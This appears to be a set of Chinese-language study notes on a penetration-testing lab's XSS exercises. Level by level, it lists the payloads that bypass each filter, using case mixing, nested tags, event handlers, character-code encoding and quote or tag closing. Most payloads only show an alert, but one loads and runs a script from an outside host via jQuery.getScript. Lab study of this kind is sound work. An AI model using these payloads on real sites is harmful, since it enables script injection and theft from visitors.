# Pentester
常用url编码
%20--空格  %27--单引号  %3C--<  %3E-->
测试特殊符号:
<>"JavAScriPT'/:on
第一关:
name=<script>alert('xss')</script>
name=<iframe src=javascript:alert('xss')></iframe>
name=<a href=javascript:alert('xss')>click me</a>
name=<img src=1%20onerror=alert('xss')>  
name=<img src=http://www.sqlsec.com/favicon.icoonclick=alert('xss')> 

常见的事件：
window事件:
onerror  在错误发生时运行的脚本
onload	 页面结束加载之后触发
键盘事件:
onkeydown	在用户按下按键时触发
onkeypress	在用户敲击按钮时触发
onkeyup	    当用户释放按键时触发
鼠标事件:
onclick	元素上发生鼠标点击时触发
onmousedown	当元素上按下鼠标按钮时触发
onmousemove	当鼠标指针移动到元素上时触发。
onmouseover	当鼠标指针移动到元素上时触
onmouseout	当鼠标指针移出元素时触发
onmouseup	当在元素上释放鼠标按钮时触发
new:
onwebkitanimationend 
ontouchmove      移动端手指点击触发

payload:javascript:alert(1)'1'onerror=jQuery.getScript('//ifo.pw/WenBWc')>2222222
第二关:
name=<ScriPT>alert('xss')</ScriPT>

第三关:
name=<ScriP<scRipt>T>alert('xss')<ScriP<scRipt>T>

第四关:
script报错 大小写还是报错
编码绕过失败 采用构造标签绕过
<img src=2 onerror=alert('xss')>

第五关:
<>"JavAScriPT'/:on 
全部回显
alert --> error
<script></script> 没有报error
可能过滤了alert函数
1.构造标签
2.对alert编码  --> 可以执行javascript代码故采用String.fromCharCode
fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。
name=<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))</script>

第六关:
<>"JavAScriPT'/:on 
<script>
	var $a= "<>"JavAScriPT'/:on";
</script>

方法闭合" 
"; alert('xss');"
或者闭合<script>标签
1";</script><img src=0 onerror=alert('xss')><script>

第七关:
<>"JavAScriPT'/:on; 
&lt;&gt;&quot;JavAScriPT'/:on 
进行了实体编码
在 HTML 中，某些字符是预留的。在 HTML 中不能使用小于号（<）和大于号（>），这是因为浏览器会误认为它们是标签。
如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体。如需显示小于号，我们必须这样写：&lt; 或 &#60;

HTML 中的常用字符实体是不间断空格(&nbsp;)。浏览器总是会截短 HTML 页面中的空格。
如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个。如需在页面中增加空格的数量，您需要使用 &nbsp; 字符实体。
< --> &lt;
/> --> &gt;
" --> &quot
1';alert('xss');'

第八关:
<>"JavAScriPT'/:on; 
&lt;&gt;&quot;JavAScriPT'/:on;
<>"被转换
输出在html环境中

无法使用<>即无法创造<script>环境也没法构造标签利用事件
考虑编码
发现form action中url和访问的url有关
/"><img%20src=0%20onerror=alert('xss')><form%20action=""

第九关：
<>"JavAScriPT'/:on; 
%3C%3E%22JavAScriPT'/:on;
<>" 显示在页面进行了url编码
<img src='https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png' onclick=alert('xss')>